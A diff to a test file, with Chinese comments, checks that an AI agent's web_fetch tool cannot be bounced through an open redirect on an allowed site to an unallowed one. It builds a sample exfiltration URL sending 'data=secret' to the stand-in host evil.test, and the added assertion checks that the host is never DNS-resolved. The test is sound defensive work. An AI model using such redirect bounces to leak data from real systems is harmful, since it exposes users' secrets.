@@ -242,7 +242,8 @@ def test_an_allowed_site_cannot_bounce_the_fetch_to_a_site_you_never_allowed(sit
     site.routes["/"] = page("<p>首页</p>")
     site.routes["/go"] = _open_redirect
     site.routes["/collect"] = page("<p>收到了</p>")
-    made = make_tool(fetcher("site.test", "evil.test"))
+    site_fetcher = fetcher("site.test", "evil.test")
+    made = make_tool(site_fetcher)
     made.tool.run({"url": site.url("/")})  # 第一次读 site.test（假设你点了允许）
     evil = site.url("/collect?data=secret", host="evil.test")
     bounce = site.url("/go?to=" + quote(evil, safe=""))
@@ -250,6 +251,7 @@ def test_an_allowed_site_cannot_bounce_the_fetch_to_a_site_you_never_allowed(sit
     result = made.tool.run({"url": bounce})
     hosts = [request["headers"]["host"].split(":")[0] for request in site.requests]
     assert "evil.test" not in hosts  # evil.test 一个字节都没收到
+    assert "evil.test" not in site_fetcher.resolved  # 连域名都没解析：解析本身就会把名字里的字送到那边的 DNS 服务器
     assert evil in result and "web_fetch" in result  # 告诉模型跳到了哪儿、要读它得自己再调用一次
     assert permissions.review("web_fetch", {"url": evil}, made.tool) is not None  # 那时照常先问你
 
